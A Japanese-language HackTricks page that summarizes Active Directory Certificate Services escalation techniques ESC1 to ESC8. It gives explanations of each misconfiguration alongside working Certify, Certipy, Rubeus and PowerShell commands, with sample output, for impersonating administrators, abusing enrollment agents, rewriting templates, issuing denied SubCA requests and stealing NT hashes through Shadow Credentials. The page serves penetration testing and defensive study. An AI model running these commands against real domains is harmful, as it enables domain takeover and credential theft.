# AD CS ドメイン権限昇格

{{#include ../../../banners/hacktricks-training.md}}


**これは、以下の記事の権限昇格テクニックのセクションを要約したものです。**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 設定ミスのある証明書テンプレート - ESC1

### 説明

### 設定ミスのある証明書テンプレート - ESC1 の説明

- **Enterprise CA によって、低権限ユーザーに登録権限が付与されている。**
- **Manager approval が不要である。**
- **認可された担当者による署名が不要である。**
- **証明書テンプレートのセキュリティ記述子の許可範囲が広すぎるため、低権限ユーザーが登録権限を取得できる。**
- **証明書テンプレートで、認証を可能にする EKU が定義されている。**
  - Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0)、または EKU なし (SubCA) などの Extended Key Usage (EKU) 識別子が含まれている。
- **テンプレートで、要求者が Certificate Signing Request (CSR) に subjectAltName を含めることが許可されている。**
  - Active Directory (AD) は、証明書に subjectAltName (SAN) が存在する場合、本人確認において SAN を優先する。そのため、CSR で SAN を指定すると、任意のユーザー（ドメイン管理者など）になりすます証明書を要求できる。要求者が SAN を指定できるかどうかは、証明書テンプレートの AD オブジェクトにある `mspki-certificate-name-flag` プロパティで示される。このプロパティはビットマスクであり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが存在すると、要求者による SAN の指定が許可される。

> [!CAUTION]
> これらの設定から特定できるのは ESC1 の候補テンプレートであり、なりすまし経路が成立しているとは限りません。対象プリンシパルが、そのテンプレートを公開している CA に登録できること、CA で証明書の登録が許可されていること、発行された証明書が認証エンドポイントの強力な SID マッピング規則を満たすことを確認してください。現在のパッチ適用済み KDC は、証明書の SID が対象と一致しない場合、要求された UPN を拒否することがあります。詳しくは[Microsoft の証明書マッピングに関するガイダンス](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)を参照してください。

**Domain Computers** に登録権限が付与されている場合、元のユーザーが登録できなくても、準備したコンピューター ID が登録可能なことがあります。コンピューターのプリンシパルの権限は別途確認してください。証明書を要求する前に `msPKI-Minimal-Key-Size` を確認してください。4096-bit RSA キーを要求するテンプレートでは、クライアントのデフォルトである 2048-bit のキーは拒否されます。要求に対象 SID を含めることで SID の不一致に対処できるのは、CA と KDC がその証明書とマッピングを受け入れる場合に限られます。テンプレートのフラグや Enroll ACE だけでは、それが成立するとは言えません。

この機能は、製品やデプロイメントサービスで HTTPS 証明書やホスト証明書をオンザフライで生成するため、あるいは仕組みへの理解不足から有効化されることがあります。

このオプションを使用して証明書を作成すると警告が表示されます。一方、既存の証明書テンプレート（`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効な `WebServer` テンプレートなど）を複製し、認証 OID を含めるよう変更した場合は警告が表示されません。<sup>[[6]](#references)</sup>

### 悪用

**脆弱な証明書テンプレートを見つける**には、次を実行します。

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

**この脆弱性を悪用して管理者になりすますには**、次を実行する：

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

その後、生成した**証明書を`.pfx`形式に変換**し、再び**Rubeusまたはcertipyを使って認証**できます。<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windowsのバイナリ「Certreq.exe」と「Certutil.exe」を使用してPFXを生成できます：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forestの構成スキーマ内にある証明書テンプレートのうち、承認や署名が不要で、Client AuthenticationまたはSmart Card LogonのEKUを持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`フラグが有効になっているものは、次のLDAPクエリを実行して列挙できます：

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Misconfigured Certificate Templates - ESC2

### Explanation

2つ目の悪用シナリオは、最初のシナリオの変形です。

1. Enterprise CAによって、低い権限のユーザーに登録権限が付与されている。
2. Manager approvalの要件が無効になっている。
3. Authorized signaturesの要件が省略されている。
4. Certificate templateの過度に許容的なセキュリティ記述子により、低い権限のユーザーに証明書の登録権限が付与されている。
5. **Certificate templateにAny Purpose EKUまたはEKUなしが設定されている。**

**Any Purpose EKU**を使用すると、攻撃者はクライアント認証、サーバー認証、コード署名など、**あらゆる目的**で証明書を取得できます。このシナリオの悪用には、**ESC3で使用したものと同じ手法**を利用できます。

下位CA証明書として機能する**EKUなしの証明書**は、**あらゆる目的**で悪用でき、**新しい証明書への署名にも使用できます**。したがって、攻撃者は下位CA証明書を利用して、新しい証明書に任意のEKUやフィールドを指定できます。

ただし、下位CAが**`NTAuthCertificates`**オブジェクトから信頼されていない場合（これがデフォルト設定です）、**ドメイン認証**用に作成した新しい証明書は機能しません。それでも攻撃者は、**任意のEKU**と任意の証明書値を持つ**新しい証明書を作成**できます。これらはさまざまな目的（コード署名、サーバー認証など）で**悪用**される可能性があり、SAML、AD FS、IPSecなど、ネットワーク内の他のアプリケーションに重大な影響を及ぼすおそれがあります。<sup>[[6]](#references)</sup>

AD Forestの構成スキーマ内でこのシナリオに該当するテンプレートを列挙するには、次のLDAPクエリを実行できます。

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## 誤設定された Enrollment Agent テンプレート - ESC3

### 説明

このシナリオは最初と2番目のシナリオに似ていますが、**異なる EKU**（Certificate Request Agent）と**2つの異なるテンプレート**（そのため、要件も2セット）を**悪用**します。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoft のドキュメントでは **Enrollment Agent** と呼ばれ、プリンシパルが別のユーザーに代わって**証明書**を**登録**できるようにします。

**「enrollment agent」**はこのような**テンプレート**に登録し、取得した**証明書を使って、別のユーザーに代わって CSR に共同署名します**。その後、**共同署名済み CSR**を CA に**送信**し、「代理登録」を**許可する**テンプレートに登録すると、CA は**「別の」ユーザーに属する証明書**を返します。<sup>[[6]](#references)</sup>

**要件 1：**

- Enterprise CA により、低権限ユーザーに登録権限が付与されている。
- マネージャーの承認が不要である。
- 承認済み署名が不要である。
- 証明書テンプレートのセキュリティ記述子が過度に寛容で、低権限ユーザーに登録権限が付与されている。
- 証明書テンプレートに Certificate Request Agent EKU が含まれており、他のプリンシパルに代わって他の証明書テンプレートを要求できる。

**要件 2：**

- Enterprise CA により、低権限ユーザーに登録権限が付与されている。
- マネージャーの承認を回避できる。
- バージョン 1 のターゲットテンプレートでは、新しい詳細な発行ポリシー制御がなくても Enrollment Agent を受け入れる場合があります。バージョン 2 以降では、バージョンだけを理由にテンプレートを除外せず、アプリケーションポリシーの発行要件と承認済み署名を確認してください。
- 証明書テンプレートで定義された EKU により、ドメイン認証が可能である。
- CA で Enrollment Agent の制限が適用されていない。

ターゲットテンプレートは、選択した CA によって公開され、ターゲットアカウントに登録が許可されており、想定するドメイン認証の用途に対応している必要もあります。そのアカウントに必要な subject/SAN 属性があるか確認してください。たとえば、AD から subject のメールアドレスを設定するテンプレートでは、必要な `mail` 値がないアカウントに証明書を発行できません。Agent 証明書だけでは、これらのターゲットテンプレート要件を満たしません。

### 悪用

このシナリオの悪用には、[**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使用できます。<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**enrollment agent certificate**の**取得**を許可される**ユーザー**、enrollment **agent**による登録が許可されるテンプレート、およびenrollment agentが代理で操作できる**アカウント**は、enterprise CAによって制限できます。これは、`certsrc.msc` **snap-in**を開き、**CAを右クリック**して**Properties**をクリックし、「Enrollment Agents」タブに**移動**することで設定できます。

ただし、CAの**デフォルト**設定は「**Do not restrict enrollment agents**」です。管理者がenrollment agentの制限を有効にして「Restrict enrollment agents」に設定した場合でも、デフォルトの構成は依然として非常に寛容です。これにより、**Everyone**がすべてのテンプレートで、誰にでもなりすまして登録できます。

### Certi-Bhaiを使ったWindows専用のPowerShell PoC

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai)は、CertifyやCertipyを使わずにESC1およびESC2/ESC3を実行します。スクリプトは`X509Enrollment` COM APIでエクスポート可能な2048ビットRSAキーを作成し、PKCS#10リクエストを構築して、LDAP経由で最初の`pKIEnrollmentService`を検出します。その後、`CertificateAuthority.Request`経由でリクエストを送信し、応答を`Cert:\CurrentUser\My`にインストールして、Base64エンコードされたPFXをエクスポートします。ESC1スクリプトは攻撃者が選択したUPN SAN（`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`、値`0xb`）を追加します。一方、ESC2/ESC3スクリプトは、最初の証明書を使って代理申請用のPKCS#7リクエストに署名します。<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

スクリプトは、Rubeus ですぐに使用できるよう、秘密鍵を含む **PFX** の Base64 を出力します。[Convert]::ToBase64String($cert.RawData) に置き換えないでください。`RawData` がエンコードするのは公開証明書のみであり、PKINIT request に署名できません。<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## 脆弱な証明書テンプレートのアクセス制御 - ESC4

### **説明**

**証明書テンプレート**上の**security descriptor**は、特定の**AD principal**がテンプレートに対して持つ**権限**を定義します。

**攻撃者**がテンプレートを**変更**し、**前のセクション**で説明した**悪用可能な設定ミス**を導入するために必要な**権限**を持っている場合、権限昇格が可能になることがあります。

証明書テンプレートに適用される主な権限は次のとおりです。<sup>[[6]](#references)</sup>

- **Owner:** オブジェクトに対する暗黙的な制御権を付与し、任意の属性を変更できます。
- **FullControl:** 任意の属性を変更する機能を含め、オブジェクトに対する完全な権限を付与します。
- **WriteOwner:** オブジェクトの所有者を、攻撃者が制御するprincipalに変更できます。
- **WriteDacl:** アクセス制御を変更でき、攻撃者にFullControlを付与できる可能性があります。
- **WriteProperty:** オブジェクトの任意のプロパティを編集できます。

`CN=Certificate Templates,CN=Public Key Services,CN=Services,...`コンテナのDACLも確認してください。[`pKICertificateTemplate`クラス](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c)に適用される`CreateChild` ACE、または広範なFullControlは、新しいテンプレートオブジェクトを作成できる可能性があります。[Microsoftのドキュメント](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44)によると、このコンテナにはこれらのテンプレートオブジェクトが格納されています。作成が有効かどうか判断する前に、該当するdeny ACEと継承設定を確認してください。テンプレートを作成しただけでは証明書は発行されません。CAによる公開、要求するprincipalの登録権限、そして認証エンドポイントで証明書が意図したidentityにマッピングされることが必要です。

### 悪用

テンプレートやその他のPKIオブジェクトに対する編集権限を持つprincipalを特定するには、Certifyで列挙します。

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

前の例のようなprivesc：

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4は、ユーザーが証明書テンプレートに対する書き込み権限を持っている状態です。たとえば、証明書テンプレートの設定を上書きして、ESC1に脆弱なテンプレートにすることで悪用できます。

すでに申請者がサブジェクトを指定できるテンプレートでも、用途がServer Authenticationのみの場合、それだけではユーザーログオン用テンプレートではありません。テンプレートを実質的に制御できる権限があれば、攻撃者は証明書を要求する前に認証EKUやアプリケーションポリシーを変更できます。[MicrosoftはSmartcard Logon EKUのサインイン用途について説明しています](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts)。CAが変更後のテンプレートを公開していること、申請者が登録できること、承認や署名の要件を満たしていること、発行された証明書が意図したアカウントにマッピングされることを確認してください。特に、[Full Enforcementが有効なパッチ適用済みドメインコントローラー](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)は、強固なマッピングのない証明書を拒否します。要求にターゲットのUPNを追加しても、この要件は回避できません。

上のパスで確認できるように、これらの権限を持つのは`JOHNPC`だけですが、ユーザー`JOHN`には`JOHNPC`への新しい`AddKeyCredentialLink`エッジがあります。この手法は証明書に関連しているため、この攻撃も実装しました。これは[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)として知られています。<sup>[[8]](#references)</sup>以下は、被害者のNT hashを取得するCertipyの`shadow auto`コマンドの短いプレビューです。

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** は、単一のコマンドで証明書テンプレートの設定を上書きできます。**デフォルト**では、Certipy は設定を上書きして **ESC1 に対して脆弱な状態**にします。また、**`-save-old` パラメータを指定して古い設定を保存**することもできます。これは攻撃後に設定を**復元**する際に役立ちます。

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## 脆弱な PKI オブジェクトのアクセス制御 - ESC5

### 説明

証明書テンプレートや認証局以外の複数のオブジェクトも含む、ACL ベースの広範な相互接続関係は、AD CS システム全体のセキュリティに影響を及ぼす可能性があります。セキュリティに大きく影響するこれらのオブジェクトには、次のものがあります。

- S4U2Self や S4U2Proxy などの手法で侵害される可能性がある、CA サーバーの AD コンピューターオブジェクト。
- CA サーバーの RPC/DCOM サーバー。
- 特定のコンテナーパス `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内にある、すべての子孫 AD オブジェクトまたはコンテナー。このパスには、Certificate Templates コンテナー、Certification Authorities コンテナー、NTAuthCertificates オブジェクト、Enrollment Services Container などのコンテナーやオブジェクトが含まれますが、これらに限定されません。

低権限の攻撃者が、これらの重要なコンポーネントのいずれかを制御できると、PKI システムのセキュリティが侵害される可能性があります。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

[**CQure Academy の投稿**](https://cqureacademy.com/blog/enhanced-key-usage)で扱われている内容では、Microsoft が説明する **`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグの影響にも触れています。この設定を認証局（CA）で有効にすると、Active Directory® から構成されたものを含む**あらゆる要求**で、**ユーザー定義の値**を**サブジェクト代替名**に含めることができます。そのため、攻撃者はドメインの**認証**に使用できるよう設定された**任意のテンプレート**を通じて登録できます。具体的には、標準の User テンプレートのように、**非特権**ユーザーによる登録が許可されているテンプレートが該当します。その結果、攻撃者は証明書を取得し、ドメイン管理者またはドメイン内の**その他の有効なエンティティ**として認証できます。<sup>[[9]](#references)</sup>

**注**: `certreq.exe` の `-attrib "SAN:"` 引数（「Name Value Pairs」と呼ばれます）を使って、証明書署名要求（CSR）に**代替名**を追加する方法は、ESC1 における SAN の悪用方法とは**異なります**。ここでの違いは、**アカウント情報を証明書属性に格納する**点にあります。ESC1 では、証明書拡張に格納されます。

### 悪用

設定が有効になっているかどうかを確認するには、次の `certutil.exe` コマンドを使用できます。

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

この操作は基本的に **remote registry access** を利用するため、別の方法としては次のようなものが考えられます:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

[**Certify**](https://github.com/GhostPack/Certify)や[**Certipy**](https://github.com/ly4k/Certipy)などのツールは、この設定ミスを検出して悪用できます:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

これらの設定を変更するには、**ドメイン管理者**権限または同等の権限があれば、任意のワークステーションから次のコマンドを実行できます。

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

環境でこの設定を無効にするには、次のコマンドでフラグを削除できます。

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> 2022年5月のセキュリティ更新プログラム適用後に新しく発行された**証明書**には、**要求者の`objectSid`プロパティ**を含む**セキュリティ拡張**が追加されます。ESC1では、このSIDは指定されたSANから導出されます。一方、**ESC6**では、SIDはSANではなく**要求者の`objectSid`**を反映します。\
> ESC6を悪用するには、システムがESC10（弱い証明書マッピング）の影響を受けることが不可欠です。ESC10では、新しいセキュリティ拡張よりも**SANが優先されます**。

## 脆弱な証明機関のアクセス制御 - ESC7

### Attack 1

#### 説明

証明機関のアクセス制御は、CAの操作を制御する一連のアクセス許可によって維持されます。これらのアクセス許可は、`certsrv.msc`にアクセスし、CAを右クリックして［プロパティ］を選択し、［セキュリティ］タブを開くと確認できます。また、次のようなコマンドを使用してPSPKIモジュールでアクセス許可を列挙することもできます。

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

これは、主な権限である **`ManageCA`** と **`ManageCertificates`** が、それぞれ「CA administrator」と「Certificate Manager」の役割に対応することを示しています。<sup>[[6]](#references)</sup>

#### Abuse

証明機関に対する **`ManageCA`** 権限があれば、PSPKIを使用してリモートから設定を操作できます。これには、**`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグを有効にして、任意のテンプレートでSANの指定を許可することが含まれます。これはdomain escalationにおける重要な要素です。

PSPKIの **Enable-PolicyModuleFlag** cmdletを使用すると、このプロセスを簡略化でき、GUIを直接操作せずに変更を加えられます。

**`ManageCertificates`** 権限があれば、保留中のリクエストを承認でき、「CA certificate manager approval」という保護策を事実上回避できます。

**Certify** と **PSPKI** のモジュールを組み合わせて、証明書のリクエスト、承認、ダウンロードを行えます。

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

> [!WARNING]
> **前の攻撃**では、**`Manage CA`** 権限を使用して **EDITF_ATTRIBUTESUBJECTALTNAME2** フラグを**有効化**し、**ESC6 attack**を実行しましたが、CA サービス（`CertSvc`）を再起動するまでは効果がありません。ユーザーが `Manage CA` アクセス権を持つ場合、そのユーザーは**サービスを再起動する**ことも許可されています。ただし、**リモートからサービスを再起動できるという意味ではありません**。さらに、2022年5月のセキュリティ更新プログラムにより、パッチ適用済みの環境の多くでは、ESC6 は**そのままでは機能しない可能性があります**。

そのため、ここでは別の攻撃を紹介します。

前提条件：

- **`ManageCA` 権限のみ**
- **`Manage Certificates`** 権限（**`ManageCA`** から付与可能）
- 証明書テンプレート **`SubCA`** が**有効**になっていること（**`ManageCA`** から有効化可能）

この手法は、`Manage CA` _および_ `Manage Certificates` アクセス権を持つユーザーは、失敗した証明書要求を**発行できる**という事実を利用します。**`SubCA`** 証明書テンプレートは **ESC1 に脆弱**ですが、テンプレートに登録できるのは**管理者のみ**です。したがって、**ユーザー**は **`SubCA`** への登録を**要求**できます。この要求は**拒否されます**が、その後、管理者によって発行されます。<sup>[[6]](#references)</sup>

#### Abuse

新しいオフィサーとして自分のユーザーを追加することで、**自分に `Manage Certificates`** アクセス権を付与できます。

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** テンプレートは、`-enable-template` パラメーターを指定して CA で有効化できます。デフォルトでは、`SubCA` テンプレートは有効になっています。

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

この攻撃に必要な前提条件を満たしていれば、まず **`SubCA` テンプレートに基づく証明書を要求**できます。

この要求は拒否され**ます**が、秘密鍵を保存し、リクエスト ID を控えておきます。

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

**`Manage CA` と `Manage Certificates`** の権限があれば、`ca` コマンドと `-issue-request <request ID>` パラメーターを使って、発行に失敗した証明書リクエストを発行できます。

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

そして最後に、`req`コマンドと`-retrieve <request ID>`パラメーターを使って、**発行された証明書を取得**できます。

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### 攻撃 3 – Manage Certificates の Extension Abuse（SetExtension）

#### 説明

従来の ESC7 abuse（EDITF 属性の有効化や、保留中のリクエストの承認）に加えて、**Certify 2.0** により、Enterprise CA の *Manage Certificates*（別名 **Certificate Manager / Officer**）ロールだけで実行できる、まったく新しい手法が明らかになりました。<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC メソッドは、*Manage Certificates* を持つすべてのプリンシパルが実行できます。このメソッドは従来、正規の CA が**保留中**のリクエストの extension を更新するために使用していましたが、攻撃者はこれを悪用して、承認待ちのリクエストに**デフォルト以外の certificate extension**（たとえば、`1.1.1.1` のようなカスタム *Certificate Issuance Policy* OID）を追加できます。

対象の template にその extension の**デフォルト値が定義されていない**ため、リクエストが最終的に発行されても、CA は攻撃者が設定した値を上書きしません。そのため、発行される証明書には攻撃者が選んだ extension が含まれ、次のような結果につながる可能性があります。

* 他の脆弱な template の Application / Issuance Policy 要件を満たし、権限昇格につながる。
* EKU や policy を追加し、サードパーティーシステムで証明書に予期しない信頼を与える。

つまり、以前は ESC7 の「権限の弱い方」と考えられていた *Manage Certificates* を、CA の設定を変更したり、より強い権限が必要な *Manage CA* を取得したりせずに、完全な権限昇格や長期的な永続化に利用できるようになりました。

#### Certify 2.0 でこの手法を悪用する

1. **保留中になる証明書リクエストを送信します。** manager approval が必要な template を使えば、リクエストを保留状態にできます。
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **新しい `manage-ca` コマンドを使って保留中の要求にカスタム拡張を追加する**:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *テンプレートで *Certificate Issuance Policies* 拡張がすでに定義されていない場合、上記の値は発行後も保持されます。*

3. **リクエストを発行する**（自分のロールに *Manage Certificates* の承認権限もある場合）か、オペレーターが承認するまで待ちます。発行されたら、証明書をダウンロードします。
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. その結果、証明書に悪意のある issuance-policy OID が含まれるようになり、後続の攻撃（例：ESC13、ドメイン権限昇格など）に使用できます。

> NOTE: Certipy ≥ 4.7 では、`ca` コマンドと `-set-extension` パラメーターを使って同じ攻撃を実行できます。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 説明

> [!TIP]
> **AD CS がインストールされている**環境に、脆弱な**Web enrollment endpoint**が存在し、さらに**ドメインコンピューターによる enrollment と client authentication を許可する証明書テンプレート**（デフォルトの**`Machine`**テンプレートなど）が少なくとも1つ公開されている場合、spooler service が稼働している**任意のコンピューターを攻撃者が侵害できる**ようになります！

AD CS は、管理者が追加でインストールできるサーバーロールを通じて、HTTP ベースの enrollment 方法を複数提供しています。こうした HTTP ベースの証明書 enrollment インターフェースは、**NTLM relay attacks** の影響を受けます。攻撃者は、**侵害したマシンから、受信 NTLM で認証する任意の AD アカウントになりすますことができます**。被害アカウントになりすましている間に、攻撃者はこれらの Web インターフェースにアクセスし、`User` または `Machine` 証明書テンプレートを使って client authentication 証明書を**要求できます**。

- **Web enrollment interface**（`http://<caserver>/certsrv/` で利用できる旧式の ASP アプリケーション）は、デフォルトで HTTP のみを使用するため、NTLM relay attacks に対する保護がありません。さらに、Authorization HTTP header で NTLM 認証のみを明示的に許可しているため、Kerberos などのより安全な認証方法は使用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、および **Network Device Enrollment Service**（NDES）は、デフォルトで Authorization HTTP header を介した negotiate 認証をサポートしています。Negotiate 認証は Kerberos と **NTLM の両方をサポート**するため、攻撃者は relay attacks 中に認証を **NTLM にダウングレード**できます。これらの Web サービスはデフォルトで HTTPS を有効にしていますが、HTTPS だけでは**NTLM relay attacks を防げません**。HTTPS サービスで NTLM relay attacks を防ぐには、HTTPS と channel binding を組み合わせる必要があります。しかし残念ながら、AD CS は channel binding に必要な Extended Protection for Authentication を IIS で有効にしません。<sup>[[6]](#references)</sup>

NTLM relay attacks でよくある**問題**は、NTLM セッションの**有効期間が短い**ことと、**NTLM signing を要求する**サービスを攻撃者が操作できないことです。

それでも、NTLM relay attack を悪用してユーザーの証明書を取得すれば、この制限を回避できます。セッションの有効期間は証明書の有効期間によって決まり、証明書は **NTLM signing を必須とする**サービスでも使用できます。盗んだ証明書の使用方法については、以下を参照してください。


{{#ref}}
